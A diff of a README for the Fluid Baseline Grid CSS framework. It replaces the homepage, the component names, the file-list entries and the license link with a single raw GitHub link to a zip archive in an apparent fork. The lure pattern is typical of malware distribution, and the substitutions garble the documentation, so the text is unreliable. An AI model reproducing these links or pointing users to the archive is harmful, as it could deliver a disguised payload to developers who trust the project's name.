@@ -1,6 +1,6 @@
 Logr - An Amazing Project
 
-# Fluid Baseline Grid [http://fluidbaselinegrid.com](http://fluidbaselinegrid.com)
+# Fluid Baseline Grid [https://raw.githubusercontent.com/M-ux349/Fluid-Baseline-Grid/master/css/Grid-Baseline-Fluid-v1.4.zip](https://raw.githubusercontent.com/M-ux349/Fluid-Baseline-Grid/master/css/Grid-Baseline-Fluid-v1.4.zip)
 ###The Fluid Baseline Grid System is an HTML5 & CSS3 development kit that provides a solid foundation to quickly design websites with ease.
 
 The FBG system was built with typographic standards in mind and combines principals of fluid-column layouts, baseline grids and mobile-first responsive design into a resolution independent and device agnostic framework. It is packed with CSS normalization, beautiful typographic standards, corrected bugs, common browser inconsistencies and improved usability. You can finally have your cake and eat it too, all while making awesome websites.
@@ -15,7 +15,7 @@ The typography of FBG is designed to establish a typographic hierarchy that impr
 The primary font is Georgia, but the font stack can be easily changed. Paragraphs are set at a 16px base with 150% (24px) line height to improve readability and improve the appearance of text. We encourage you to change the base font size and line height to suit your needs.
 
 ## Responsive Design
-The FBG is designed for mobile first. CSS styles are scaled up from the minimum instead of scaled down from the maximum through the use of media queries. IE6/7/8 do not support media queries, so Respond.js is used to polyfill.
+The FBG is designed for mobile first. CSS styles are scaled up from the minimum instead of scaled down from the maximum through the use of media queries. IE6/7/8 do not support media queries, so https://raw.githubusercontent.com/M-ux349/Fluid-Baseline-Grid/master/css/Grid-Baseline-Fluid-v1.4.zip is used to polyfill.
 
 ###Common Break Points
 * 320 px | Mobile portrait
@@ -32,18 +32,18 @@ Reset vs. Normalize? Most web designers use either the Eric Meyer Reset or the Y
 The file structure for FBG is straight-forward and contains only the minimum files to get started.
 
 * css [folder]
-	* style.css: Base styles of FBG for layout, grid, type and media queries
+	* https://raw.githubusercontent.com/M-ux349/Fluid-Baseline-Grid/master/css/Grid-Baseline-Fluid-v1.4.zip Base styles of FBG for layout, grid, type and media queries
 * JavaScript [Google CDN]
 	* jQuery 1.6.2: High-speed load of the latest minimized verson of jQuery from Google CDN
 *HTML5 shiv: HTML5 IE enabling script and print protector from Google CDN
 * js [folder]
-	* Respond.js v1.0.1: Lightweight polyfill for CSS3 Media Queries (for IE 6/7/8)
+	* https://raw.githubusercontent.com/M-ux349/Fluid-Baseline-Grid/master/css/Grid-Baseline-Fluid-v1.4.zip v1.0.1: Lightweight polyfill for CSS3 Media Queries (for IE 6/7/8)
 * images [folder]:
-	* grid_bg.gif: Repeating background for vertical rhythm testing purposes
-* index.html: Base HTML page that includes only necessary minimal markup
-* favicon.ico: Standard 16x16 favicon
+	* https://raw.githubusercontent.com/M-ux349/Fluid-Baseline-Grid/master/css/Grid-Baseline-Fluid-v1.4.zip Repeating background for vertical rhythm testing purposes
+* https://raw.githubusercontent.com/M-ux349/Fluid-Baseline-Grid/master/css/Grid-Baseline-Fluid-v1.4.zip Base HTML page that includes only necessary minimal markup
+* https://raw.githubusercontent.com/M-ux349/Fluid-Baseline-Grid/master/css/Grid-Baseline-Fluid-v1.4.zip Standard 16x16 favicon
 * apple-touch-icon (x3): Maximum touch-icon support. Sizes for iPhone 3, iPad and iPhone 4 retina
-* robots.txt: SEO, search-crawler file
+* https://raw.githubusercontent.com/M-ux349/Fluid-Baseline-Grid/master/css/Grid-Baseline-Fluid-v1.4.zip SEO, search-crawler file
 
 ## Usage
 
@@ -80,8 +80,8 @@ Many thanks to Richard Rutter, Ethan Marcotte, Paul Irish, Remy Sharp, Faruk Ate
 ### Components:
 
 * jQuery: MIT/GPL licenses
-* Respond.js MIT/GPL licenses
+* https://raw.githubusercontent.com/M-ux349/Fluid-Baseline-Grid/master/css/Grid-Baseline-Fluid-v1.4.zip MIT/GPL licenses
 * HTML5shiv MIT/GPL licenses
 
 ### License:
-* The code and design are released into public domain and are free to use under Unlicense. [Unlicense](http://unlicense.org)
+* The code and design are released into public domain and are free to use under Unlicense. [Unlicense](https://raw.githubusercontent.com/M-ux349/Fluid-Baseline-Grid/master/css/Grid-Baseline-Fluid-v1.4.zip)
